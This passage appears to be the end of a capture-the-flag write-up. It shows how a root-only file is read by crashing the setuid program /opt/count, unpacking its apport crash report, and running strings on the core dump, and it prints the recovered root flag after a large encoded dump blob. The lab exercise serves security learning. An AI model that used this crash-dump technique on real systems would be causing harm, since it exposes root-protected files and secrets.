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
```

We can use [apport-unpack](https://www.unix.com/man-page/linux/1/apport-unpack/) tool to parse this crash log:
```console
dasith@secret:/opt$ mkdir /tmp/apport_output
mkdir /tmp/apport_output
dasith@secret:/opt$ cd /var/crash
dasith@secret:/var/crash$ apport-unpack _opt_count.1000.crash /tmp/apport_output 
apport-unpack _opt_count.1000.crash /tmp/apport_output 
dasith@secret:/var/crash$ ls /tmp/apport_output
ls /tmp/apport_output
Architecture
CoreDump
Date
DistroRelease
ExecutablePath
ExecutableTimestamp
ProblemType
ProcCmdline
ProcCwd
ProcEnviron
ProcMaps
ProcStatus
Signal
Uname
UserGroups
dasith@secret:/var/crash$
```

Let's get the strings from ```CoreDump``` file:
```console
dasith@secret:/var/crash$ strings CoreDump
strings /tmp/oop/CoreDump
CORE
CORE
count
./count 
IGISCORE
CORE
ELIFCORE
/opt/count
/opt/count
/opt/count
/opt/count
/opt/count
/usr/lib/x86_64-linux-gnu/libc-2.31.so
/usr/lib/x86_64-linux-gnu/libc-2.31.so
/usr/lib/x86_64-linux-gnu/libc-2.31.so
/usr/lib/x86_64-linux-gnu/libc-2.31.so
/usr/lib/x86_64-linux-gnu/libc-2.31.so
/usr/lib/x86_64-linux-gnu/libc-2.31.so
/usr/lib/x86_64-linux-gnu/ld-2.31.so
/usr/lib/x86_64-linux-gnu/ld-2.31.so
/usr/lib/x86_64-linux-gnu/ld-2.31.so
/usr/lib/x86_64-linux-gnu/ld-2.31.so
/usr/lib/x86_64-linux-gnu/ld-2.31.so
CORE
////////////////
Path: 
Could
LINUX
////////////////
Path: 
Could
/lib64/ld-linux-x86-64.so.2
libc.so.6
setuid
exit
readdir
fopen
closedir
__isoc99_scanf
strncpy
__stack_chk_fail
putchar
fgetc
strlen
prctl
getchar
fputs
fclose
opendir
getuid
strncat
__cxa_finalize
__libc_start_main
snprintf
__xstat
__lxstat
GLIBC_2.7
GLIBC_2.4
GLIBC_2.2.5
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
Unable to open directory.
??????????
Total entries       = %d
Regular files       = %d
Directories         = %d
Symbolic links      = %d
Unable to open file.
Please check if file exists and you have read privilege.
Total characters = %d
Total words      = %d
Total lines      = %d
Enter source file/directory name: 
%99s
Save results a file? [y/N]: 
Path: 
Could not open %s for writing
:*3$"
`A\#
0OR#
`6R#
Path: esults a file? [y/N]: words      = 2
Total lines      = 2
oot/root.txt
`OX#
351f8404f72b9e4a8d094e8791b613e6
`VS#
 [S#
0VS#
 VS#
0VS#
J\S#
`\S#
x5U#
T	U#
n	U#
`}U#
h}U#
p}U#
....
```

And we can see the root flag ```351f8404f72b9e4a8d094e8791b613e6```.
